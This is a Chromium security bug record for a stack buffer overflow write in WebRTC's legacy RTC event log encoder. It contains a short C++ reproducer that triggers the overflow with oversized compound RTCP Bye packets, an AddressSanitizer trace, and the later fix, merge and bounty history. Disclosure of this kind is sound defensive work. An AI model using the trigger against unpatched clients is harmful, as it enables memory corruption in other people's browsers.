# Security: stack buffer overflow write in RtcEventLogEncoderLegacy::EncodeRtcpPacket

| Field | Value |
|-------|-------|
| **Issue ID** | [40053483](https://issues.chromium.org/issues/40053483) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>WebRTC |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ko...@gmail.com |
| **Assignee** | te...@chromium.org |
| **Created** | 2020-10-01 |
| **Bounty** | $1,000.00 |

## Description

COMPONENT  

webrtc  

component:Blink>WebRTC  

components:Blink>WebRTC

**VULNERABILITY DETAILS**  

RtcEventLogEncoderLegacy::EncodeRtcpPacket allocates a stack buffer of size IP\_PACKET\_SIZE(1500) however real packets may be up to 2048.  

Results in stack-buffer-overflow WRITE.

**VERSION**  

Chrome Version: asan-linux-release-812541

Operating System: linux

**REPRODUCTION CASE**  

To trigger the bug, the receiving side should start event log capturing ("Enable diagnostic packet and event recording" in chrome://webrtc-internals/)  

Attacker should send one large packet(>1500) for example with Bye rtcp packets

```
    std::vector<std::unique_ptr<rtcp::RtcpPacket>> packets2;  
    for (int i = 0; i < 7; i++) {  
      rtcp::Bye\* bye = new rtcp::Bye();  
      std::string reason(0xff, 'a');  
      bye->SetReason(reason);  
      packets2.emplace_back(std::unique_ptr<rtcp::RtcpPacket>(bye));  
    }  
    rtp_module->SendCombinedRtcpPacket(std::move(packets2));  

```

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

==319326==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fd80b12ae7c at pc 0x5570780e99da bp 0x7fd824bfcdf0 sp 0x7fd824bfc5b8  

WRITE of size 264 at 0x7fd80b12ae7c thread T31 (ThreadPoolForeg)  

#0 0x5570780e99d9 in \_\_asan\_memcpy /b/s/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/asan\_interceptors\_memintrinsics.cpp:22:3  

#1 0x5570922fd437 in webrtc::RtcEventLogEncoderLegacy::EncodeRtcpPacket(long, rtc::BufferT<unsigned char, false> const&, bool) third\_party/webrtc/logging/rtc\_event\_log/encoder/rtc\_event\_log\_encoder\_legacy.cc:719:9  

#2 0x5570922f6984 in webrtc::RtcEventLogEncoderLegacy::Encode(webrtc::RtcEvent const&) third\_party/webrtc/logging/rtc\_event\_log/encoder/rtc\_event\_log\_encoder\_legacy.cc  

#3 0x5570922f6659 in webrtc::RtcEventLogEncoderLegacy::EncodeBatch(std::\_\_1::\_\_deque\_iterator<std::\_\_1::unique\_ptr<webrtc::RtcEvent, std::\_\_1::default\_delete[webrtc::RtcEvent](javascript:void(0);) >, std::\_\_1::unique\_ptr<webrtc::RtcEvent, std::\_\_1::default\_delete[webrtc::RtcEvent](javascript:void(0);) > const\*, std::\_\_1::unique\_ptr<webrtc::RtcEvent, std::\_\_1::default\_delete[webrtc::RtcEvent](javascript:void(0);) > const&, std::\_\_1::unique\_ptr<webrtc::RtcEvent, std::\_\_1::default\_delete[webrtc::RtcEvent](javascript:void(0);) > const\* const\*, long, 0l>, std::\_\_1::\_\_deque\_iterator<std::\_\_1::unique\_ptr<webrtc::RtcEvent, std::\_\_1::default\_delete[webrtc::RtcEvent](javascript:void(0);) >, std::\_\_1::unique\_ptr<webrtc::RtcEvent, std::\_\_1::default\_delete[webrtc::RtcEvent](javascript:void(0);) > const\*, std::\_\_1::unique\_ptr<webrtc::RtcEvent, std::\_\_1::default\_delete[webrtc::RtcEvent](javascript:void(0);) > const&, std::\_\_1::unique\_ptr<webrtc::RtcEvent, std::\_\_1::default\_delete[webrtc::RtcEvent](javascript:void(0);) > const\* const\*, long, 0l>) third\_party/webrtc/logging/rtc\_event\_log/encoder/rtc\_event\_log\_encoder\_legacy.cc:255:23  

#4 0x5570922f11ea in webrtc::RtcEventLogImpl::LogEventsFromMemoryToOutput() third\_party/webrtc/logging/rtc\_event\_log/rtc\_event\_log\_impl.cc:228:23  

#5 0x5570922f2b95 in operator() third\_party/webrtc/logging/rtc\_event\_log/rtc\_event\_log\_impl.cc:110:5  

#6 0x5570922f2b95 in webrtc::webrtc\_new\_closure\_impl::ClosureTask<webrtc::RtcEventLogImpl::StartLogging(std::\_\_1::unique\_ptr<webrtc::RtcEventLogOutput, std::\_\_1::default\_delete[webrtc::RtcEventLogOutput](javascript:void(0);) >, long)::$\_0>::Run() third\_party/webrtc/rtc\_base/task\_utils/to\_queued\_task.h:32:5  

#7 0x557079a07f45 in (anonymous namespace)::WebrtcTaskQueue::RunTask((anonymous namespace)::WebrtcTaskQueue\*, scoped\_refptr<base::RefCountedData<bool> >, std::\_\_1::unique\_ptr<webrtc::QueuedTask, std::\_\_1::default\_delete[webrtc::QueuedTask](javascript:void(0);) >) third\_party/webrtc\_overrides/task\_queue\_factory.cc:69:17  

#8 0x557079a081bc in Invoke<void (\*)((anonymous namespace)::WebrtcTaskQueue \*, scoped\_refptr<base::RefCountedData<bool> >, std::\_\_1::unique\_ptr<webrtc::QueuedTask, std::\_\_1::default\_delete[webrtc::QueuedTask](javascript:void(0);) >), (anonymous namespace)::WebrtcTaskQueue \*, scoped\_refptr<base::RefCountedData<bool> >, std::\_\_1::unique\_ptr<webrtc::QueuedTask, std::\_\_1::default\_delete[webrtc::QueuedTask](javascript:void(0);) > > base/bind\_internal.h:393:12  

#9 0x557079a081bc in MakeItSo<void (\*)((anonymous namespace)::WebrtcTaskQueue \*, scoped\_refptr<base::RefCountedData<bool> >, std::\_\_1::unique\_ptr<webrtc::QueuedTask, std::\_\_1::default\_delete[webrtc::QueuedTask](javascript:void(0);) >), (anonymous namespace)::WebrtcTaskQueue \*, scoped\_refptr<base::RefCountedData<bool> >, std::\_\_1::unique\_ptr<webrtc::QueuedTask, std::\_\_1::default\_delete[webrtc::QueuedTask](javascript:void(0);) > > base/bind\_internal.h:637:12  

#10 0x557079a081bc in RunImpl<void (\*)((anonymous namespace)::WebrtcTaskQueue \*, scoped\_refptr<base::RefCountedData<bool> >, std::\_\_1::unique\_ptr<webrtc::QueuedTask, std::\_\_1::default\_delete[webrtc::QueuedTask](javascript:void(0);) >), std::\_\_1::tuple<base::internal::UnretainedWrapper<(anonymous namespace)::WebrtcTaskQueue>, scoped\_refptr<base::RefCountedData<bool> >, std::\_\_1::unique\_ptr<webrtc::QueuedTask, std::\_\_1::default\_delete[webrtc::QueuedTask](javascript:void(0);) > >, 0, 1, 2> base/bind\_internal.h:710:12  

#11 0x557079a081bc in base::internal::Invoker<base::internal::BindState<void (\*)((anonymous namespace)::WebrtcTaskQueue\*, scoped\_refptr<base::RefCountedData<bool> >, std::\_\_1::unique\_ptr<webrtc::QueuedTask, std::\_\_1::default\_delete[webrtc::QueuedTask](javascript:void(0);) >), base::internal::UnretainedWrapper<(anonymous namespace)::WebrtcTaskQueue>, scoped\_refptr<base::RefCountedData<bool> >, std::\_\_1::unique\_ptr<webrtc::QueuedTask, std::\_\_1::default\_delete[webrtc::QueuedTask](javascript:void(0);) > >, void ()>::RunOnce(base::internal::BindStateBase\*) base/bind\_internal.h:679:12  

#12 0x5570824d5005 in Run base/callback.h:100:12  

#13 0x5570824d5005 in base::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/task/common/task\_annotator.cc:163:33  

#14 0x557082523d06 in base::internal::TaskTracker::RunSkipOnShutdown(base::internal::Task\*) base/task/thread\_pool/task\_tracker.cc:768:19  

#15 0x557082522bff in RunTaskWithShutdownBehavior base/task/thread\_pool/task\_tracker.cc:783:7  

#16 0x557082522bff in base::internal::TaskTracker::RunTask(base::internal::Task, base::internal::TaskSource\*, base::TaskTraits const&) base/task/thread\_pool/task\_tracker.cc:632:5  

#17 0x5570825eb2f0 in base::internal::TaskTrackerPosix::RunTask(base::internal::Task, base::internal::TaskSource\*, base::TaskTraits const&) base/task/thread\_pool/task\_tracker\_posix.cc:22:16  

#18 0x557082521a47 in base::internal::TaskTracker::RunAndPopNextTask(base::internal::RegisteredTaskSource) base/task/thread\_pool/task\_tracker.cc:505:5  

#19 0x55708254edb4 in base::internal::WorkerThread::RunWorker() base/task/thread\_pool/worker\_thread.cc:349:34  

#20 0x55708254e1e1 in base::internal::WorkerThread::RunPooledWorker() base/task/thread\_pool/worker\_thread.cc:223:3  

#21 0x5570825ec7c0 in base::(anonymous namespace)::ThreadFunc(void\*) base/threading/platform\_thread\_posix.cc:87:13  

#22 0x7fd83264eea6 in start\_thread nptl/pthread\_create.c:477:8

Address 0x7fd80b12ae7c is located in stack of thread T31 (ThreadPoolForeg) at offset 1660 in frame  

#0 0x5570922fcfbf in webrtc::RtcEventLogEncoderLegacy::EncodeRtcpPacket(long, rtc::BufferT<unsigned char, false> const&, bool) third\_party/webrtc/logging/rtc\_event\_log/encoder/rtc\_event\_log\_encoder\_legacy.cc:690

This frame has 3 object(s):  

[32, 88) 'rtclog\_event' (line 691)  

[128, 144) 'header' (line 696)  

[160, 1660) 'buffer' (line 700) <== Memory access at offset 1660 overflows this variable  

HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork  

(longjmp and C++ exceptions \*are\* supported)  

Thread T31 (ThreadPoolForeg) created by T15 (ThreadPoolForeg) here:  

#0 0x5570780d498a in pthread\_create /b/s/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/asan\_interceptors.cpp:214:3  

#1 0x5570825eba4e in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThread::Delegate\*, base::PlatformThreadHandle\*, base::ThreadPriority) base/threading/platform\_thread\_posix.cc:126:13  

#2 0x55708254d5b6 in base::internal::WorkerThread::Start(base::WorkerThreadObserver\*) base/task/thread\_pool/worker\_thread.cc:70:3  

#3 0x55708253bd11 in operator() base/task/thread\_pool/thread\_group\_impl.cc:184:15  

#4 0x55708253bd11 in void base::internal::ThreadGroupImpl::ScopedCommandsExecutor::WorkerContainer::ForEachWorker[base::internal::ThreadGroupImpl::ScopedCommandsExecutor::FlushImpl()::'lambda0'(base::internal::WorkerThread\\*)](javascript:void(0);)(base::internal::ThreadGroupImpl::ScopedCommandsExecutor::FlushImpl()::'lambda0'(base::internal::WorkerThread\*)) base/task/thread\_pool/thread\_group\_impl.cc:149:9  

#5 0x55708253b7b7 in base::internal::ThreadGroupImpl::ScopedCommandsExecutor::FlushImpl() base/task/thread\_pool/thread\_group\_impl.cc:183:23  

#6 0x557082535fc7 in base::internal::ThreadGroupImpl::ScopedCommandsExecutor::FlushWorkerCreation(base::internal::CheckedLock\*) base/task/thread\_pool/thread\_group\_impl.cc:116:5  

#7 0x55708253589e in base::internal::ThreadGroupImpl::WorkerThreadDelegateImpl::GetWork(base::internal::WorkerThread\*) base/task/thread\_pool/thread\_group\_impl.cc:603:12  

#8 0x55708254ed3e in base::internal::WorkerThread::RunWorker() base/task/thread\_pool/worker\_thread.cc:336:51  

#9 0x55708254e1e1 in base::internal::WorkerThread::RunPooledWorker() base/task/thread\_pool/worker\_thread.cc:223:3  

#10 0x5570825ec7c0 in base::(anonymous namespace)::ThreadFunc(void\*) base/threading/platform\_thread\_posix.cc:87:13  

#11 0x7fd83264eea6 in start\_thread nptl/pthread\_create.c:477:8

Thread T15 (ThreadPoolForeg) created by T0 (chrome) here:  

#0 0x5570780d498a in pthread\_create /b/s/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/asan\_interceptors.cpp:214:3  

#1 0x5570825eba4e in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThread::Delegate\*, base::PlatformThreadHandle\*, base::ThreadPriority) base/threading/platform\_thread\_posix.cc:126:13  

#2 0x55708254d5b6 in base::internal::WorkerThread::Start(base::WorkerThreadObserver\*) base/task/thread\_pool/worker\_thread.cc:70:3  

#3 0x55708253bd11 in operator() base/task/thread\_pool/thread\_group\_impl.cc:184:15  

#4 0x55708253bd11 in void base::internal::ThreadGroupImpl::ScopedCommandsExecutor::WorkerContainer::ForEachWorker[base::internal::ThreadGroupImpl::ScopedCommandsExecutor::FlushImpl()::'lambda0'(base::internal::WorkerThread\\*)](javascript:void(0);)(base::internal::ThreadGroupImpl::ScopedCommandsExecutor::FlushImpl()::'lambda0'(base::internal::WorkerThread\*)) base/task/thread\_pool/thread\_group\_impl.cc:149:9  

#5 0x55708253b7b7 in base::internal::ThreadGroupImpl::ScopedCommandsExecutor::FlushImpl() base/task/thread\_pool/thread\_group\_impl.cc:183:23  

#6 0x557082533568 in base::internal::ThreadGroupImpl::ScopedCommandsExecutor::~ScopedCommandsExecutor() base/task/thread\_pool/thread\_group\_impl.cc:102:31  

#7 0x5570825347df in base::internal::ThreadGroupImpl::PushTaskSourceAndWakeUpWorkers(base::internal::TransactionWithRegisteredTaskSource) base/task/thread\_pool/thread\_group\_impl.cc:450:1  

#8 0x557082529835 in base::internal::ThreadPoolImpl::PostTaskWithSequenceNow(base::internal::Task, scoped\_refptr[base::internal::Sequence](javascript:void(0);)) base/task/thread\_pool/thread\_pool\_impl.cc:395:38  

#9 0x557082529e14 in base::internal::ThreadPoolImpl::PostTaskWithSequence(base::internal::Task, scoped\_refptr[base::internal::Sequence](javascript:void(0);)) base/task/thread\_pool/thread\_pool\_impl.cc:412:12  

#10 0x55708252707f in base::internal::ThreadPoolImpl::PostDelayedTask(base::Location const&, base::TaskTraits const&, base::OnceCallback<void ()>, base::TimeDelta) base/task/thread\_pool/thread\_pool\_impl.cc:240:10  

#11 0x55708251a585 in PostDelayedTask base/task/thread\_pool.cc:79:31  

#12 0x55708251a585 in base::ThreadPool::PostTask(base::Location const&, base::TaskTraits const&, base::OnceCallback<void ()>) base/task/thread\_pool.cc:70:10  

#13 0x5570812f93b6 in PostTask third\_party/blink/renderer/platform/scheduler/common/worker\_pool.cc:22:3  

#14 0x5570812f93b6 in blink::worker\_pool::PostTask(base::Location const&, WTF::CrossThreadOnceFunction<void ()>) third\_party/blink/renderer/platform/scheduler/common/worker\_pool.cc:15:3  

#15 0x55708d366367 in blink::ParkableStringImpl::PostBackgroundCompressionTask() third\_party/blink/renderer/platform/bindings/parkable\_string.cc:599:3  

#16 0x55708d3656f8 in ParkInternal third\_party/blink/renderer/platform/bindings/parkable\_string.cc:445:9  

#17 0x55708d3656f8 in blink::ParkableStringImpl::MaybeAgeOrParkString() third\_party/blink/renderer/platform/bindings/parkable\_string.cc:394:15  

#18 0x55708d36086b in blink::ParkableStringManager::AgeStringsAndPark() third\_party/blink/renderer/platform/bindings/parkable\_string\_manager.cc:369:14  

#19 0x5570824d5005 in Run base/callback.h:100:12  

#20 0x5570824d5005 in base::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/task/common/task\_annotator.cc:163:33  

#21 0x55708250d32f in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::sequence\_manager::LazyNow\*) base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:3  

#22 0x55708250cbaf in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:252:36  

#23 0x557082405fb0 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:39:55  

#24 0x55708250e676 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence\_manager/thread\_controller\_with\_message\_pump\_impl.cc:446:12  

#25 0x55708248247a in base::RunLoop::Run() base/run\_loop.cc:124:14  

#26 0x557094e06318 in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:256:16  

#27 0x55708220f46f in content::RunZygote(content::ContentMainDelegate\*) content/app/content\_main\_runner\_impl.cc:485:14  

#28 0x5570822128a8 in content::ContentMainRunnerImpl::Run(bool) content/app/content\_main\_runner\_impl.cc:860:10  

#29 0x55708220c351 in content::RunContentProcess(content::ContentMainParams const&, content::ContentMainRunner\*) content/app/content\_main.cc:373:36  

#30 0x55708220c98c in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:399:10  

#31 0x5570781166c5 in ChromeMain chrome/app/chrome\_main.cc:119:12  

#32 0x7fd83061acc9 in \_\_libc\_start\_main csu/../csu/libc-start.c:308:16

SUMMARY: AddressSanitizer: stack-buffer-overflow /b/s/w/ir/cache/builder/src/third\_party/llvm/compiler-rt/lib/asan/asan\_interceptors\_memintrinsics.cpp:22:3 in \_\_asan\_memcpy  

Shadow bytes around the buggy address:  

0x0ffb8161d570: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0ffb8161d580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0ffb8161d590: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0ffb8161d5a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0ffb8161d5b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

=>0x0ffb8161d5c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00[04]  

0x0ffb8161d5d0: f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3  

0x0ffb8161d5e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0ffb8161d5f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0ffb8161d600: f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5  

0x0ffb8161d610: f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==319326==ABORTING

**CREDIT INFORMATION**  

Reporter credit: Tolya Korniltsev [korniltsev.anatoly@gmail.com](mailto:korniltsev.anatoly@gmail.com)

## Attachments

- [apprtc.diff](attachments/apprtc.diff) (text/plain, 3.1 KB)

## Timeline

### ko...@gmail.com (2020-10-01)

apprtc reproducer patch

### do...@chromium.org (2020-10-02)

Thanks for the report.

+WebRTC folks, can you take a look at this please? It looks like a potential renderer process crash overflow write.

### te...@webrtc.org (2020-10-02)

Thanks for the report.

hbos@, could you reassign to my chromium account? I don't seem to be able to modify the bug from my webrtc account.

### gu...@chromium.org (2020-10-02)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-02)

Setting milestone and target because of Security_Impact=Stable and medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### te...@chromium.org (2020-10-05)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-10-05)

The following revision refers to this bug:
  https://webrtc.googlesource.com/src.git/+/9f0c89bd56603927d4032c314610636f1f2cb504

commit 9f0c89bd56603927d4032c314610636f1f2cb504
Author: Bjorn Terelius <terelius@webrtc.org>
Date: Mon Oct 05 15:26:54 2020

Allow RTCP packets longer than 1500 bytes in RTC event log.

Bug: chromium:1134107
Change-Id: I05da32c57537c3c2fddae96918ff4e4685d62043
Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/186720
Reviewed-by: Elad Alon <eladalon@webrtc.org>
Commit-Queue: Björn Terelius <terelius@webrtc.org>
Cr-Commit-Position: refs/heads/master@{#32315}

[modify] https://crrev.com/9f0c89bd56603927d4032c314610636f1f2cb504/logging/rtc_event_log/encoder/rtc_event_log_encoder_legacy.cc
[modify] https://crrev.com/9f0c89bd56603927d4032c314610636f1f2cb504/logging/rtc_event_log/encoder/rtc_event_log_encoder_new_format.cc


### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-10-05)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/9e601fcc4c3a06d484fb4df421b7bc56ae053f41

commit 9e601fcc4c3a06d484fb4df421b7bc56ae053f41
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Mon Oct 05 20:05:31 2020

Roll WebRTC from 04482985b204 to 9f0c89bd5660 (1 revision)

https://webrtc.googlesource.com/src.git/+log/04482985b204..9f0c89bd5660

2020-10-05 terelius@webrtc.org Allow RTCP packets longer than 1500 bytes in RTC event log.

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/webrtc-chromium-autoroll
Please CC webrtc-chromium-sheriffs-robots@google.com on the revert to ensure that a human
is aware of the problem.

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+doc/master/autoroll/README.md

Bug: chromium:1134107
Tbr: webrtc-chromium-sheriffs-robots@google.com
Change-Id: Ib0931871d91b0e306e3f63bd910d2f30c60171f6
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2450851
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#813869}

[modify] https://crrev.com/9e601fcc4c3a06d484fb4df421b7bc56ae053f41/DEPS


### te...@chromium.org (2020-10-14)

korniltsev.anatoly@gmail.com, could you confirm that the bug has been fixed in Chrome Canary?

### [Deleted User] (2020-10-14)

This bug requires manual review: DEPS changes referenced in bugdroid comments.
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: benmason@(Android), bindusuvarna @(iOS), cindyb@(ChromeOS), lakpamarthy@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ko...@gmail.com (2020-10-14)

Confirm the bug is fixed in "Version 86.0.4240.75 (Official Build) unknown (64-bit)"

### te...@chromium.org (2020-10-15)

Re #11: The bug should be fixed at HEAD, but as far as I can tell, not in 86.0.4240.75 Could you double check?

### ko...@gmail.com (2020-10-15)

I did retest.
linux Version 86.0.4240.75 (Official Build) unknown (64-bit) -> segfault
macos Version 88.0.4293.0 (Official Build) canary (x86_64) -> good, no crash

### la...@google.com (2020-10-16)

terelius@ - please address the merge questionnaire in c#10 to consider the approval? Thanks!

### te...@chromium.org (2020-10-19)

Answers to #10:

1. Yes.
2. https://webrtc-review.googlesource.com/c/src/+/186720
3. Yes.
4. No. The fix is in M88, and M86 is already rolled/rolling out.
5. Security bug. (OOB write, but only if a special type of debug logging is enabled.)
6. No.
7. N/A


### te...@chromium.org (2020-10-19)

[Empty comment from Monorail migration]

### te...@chromium.org (2020-10-19)

[Empty comment from Monorail migration]

### gu...@chromium.org (2020-10-19)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-10-19)

I'm not sure why it was determined that this is security severity medium, it looks High to me, so I'm bumping up.

On that basis we'd want to merge this back to both M87 and M86. (We continue to do regular M86 security refreshes).

The fix looks simple and self-explanatory so I am going to approve merge to M87 (branch 4280) and M86 (branch 4240).

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-10-19)

The following revision refers to this bug:
  https://webrtc.googlesource.com/src.git/+/945b7d8e31a63e4be70ba41a0064189034ebf341

commit 945b7d8e31a63e4be70ba41a0064189034ebf341
Author: Bjorn Terelius <terelius@webrtc.org>
Date: Mon Oct 19 21:52:38 2020

Add test for logging of large compound RTCP packets.

Bug: chromium:1134107
Change-Id: Ic6ce50d33700c05733747584ce45480660cf64c9
Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/188583
Reviewed-by: Elad Alon <eladalon@webrtc.org>
Commit-Queue: Björn Terelius <terelius@webrtc.org>
Cr-Commit-Position: refs/heads/master@{#32445}

[modify] https://crrev.com/945b7d8e31a63e4be70ba41a0064189034ebf341/logging/rtc_event_log/encoder/rtc_event_log_encoder_unittest.cc
[modify] https://crrev.com/945b7d8e31a63e4be70ba41a0064189034ebf341/logging/rtc_event_log/logged_events.cc
[modify] https://crrev.com/945b7d8e31a63e4be70ba41a0064189034ebf341/logging/rtc_event_log/logged_events.h
[modify] https://crrev.com/945b7d8e31a63e4be70ba41a0064189034ebf341/logging/rtc_event_log/rtc_event_log_parser.cc
[modify] https://crrev.com/945b7d8e31a63e4be70ba41a0064189034ebf341/logging/rtc_event_log/rtc_event_log_parser.h


### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-10-20)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/f936fd484612ce35b8c46498e6c0bfcac4ea39c6

commit f936fd484612ce35b8c46498e6c0bfcac4ea39c6
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Tue Oct 20 04:14:38 2020

Roll WebRTC from e15fb15035fe to d273ed0320fc (3 revisions)

https://webrtc.googlesource.com/src.git/+log/e15fb15035fe..d273ed0320fc

2020-10-19 chromium-webrtc-autoroll@webrtc-ci.iam.gserviceaccount.com Roll chromium_revision 581ea988ec..5939e063ba (818521:818652)
2020-10-19 terelius@webrtc.org Add test for logging of large compound RTCP packets.
2020-10-19 chromium-webrtc-autoroll@webrtc-ci.iam.gserviceaccount.com Roll chromium_revision cb51eef7ac..581ea988ec (818409:818521)

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/webrtc-chromium-autoroll
Please CC webrtc-chromium-sheriffs-robots@google.com on the revert to ensure that a human
is aware of the problem.

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+doc/master/autoroll/README.md

Bug: chromium:1134107
Tbr: webrtc-chromium-sheriffs-robots@google.com
Change-Id: Ia46606fe87a919edbe31a24190a8f566fa4f69df
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2486803
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#818788}

[modify] https://crrev.com/f936fd484612ce35b8c46498e6c0bfcac4ea39c6/DEPS


### te...@chromium.org (2020-10-20)

Merged to M87 here: https://webrtc-review.googlesource.com/c/src/+/189800

The fix has been verified in canary. I assume this needs to be verified in beta too before merging to M86?

### te...@chromium.org (2020-10-20)

I ran a call with logging enabled on the M87 branch as a sanity test. No issues found. Will proceed with M86 merge.

### te...@chromium.org (2020-10-20)

Merged to M86 here: https://webrtc-review.googlesource.com/c/src/+/189785

### [Deleted User] (2020-10-23)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-10-26)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@google.com (2020-10-27)

I have confirmed the relevant commit is in WebRTC branch-heads 4280 and 4240 so I am adjusting merge labels appropriately.

terelius@, I believe this bug is Fixed so I'm marking as such. Please reopen if I'm wrong.

### [Deleted User] (2020-10-28)

[Empty comment from Monorail migration]

### ad...@google.com (2020-10-30)

[Empty comment from Monorail migration]

### ad...@google.com (2020-10-30)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-30)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-31)

[Empty comment from Monorail migration]

### ad...@google.com (2020-11-03)

[Empty comment from Monorail migration]

### aa...@google.com (2020-11-04)

[Empty comment from Monorail migration]

### ad...@google.com (2020-11-04)

When I bumped this to High in https://crbug.com/chromium/1134107#c19, I had missed the need to enable logging, so bumping back to Medium.

### ad...@google.com (2020-11-05)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### ad...@google.com (2020-11-05)

The VRP panel has decided to award $1,000 for this bug. Thanks for the report!

### ad...@google.com (2020-11-05)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-20)

[Empty comment from Monorail migration]

### [Deleted User] (2021-02-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

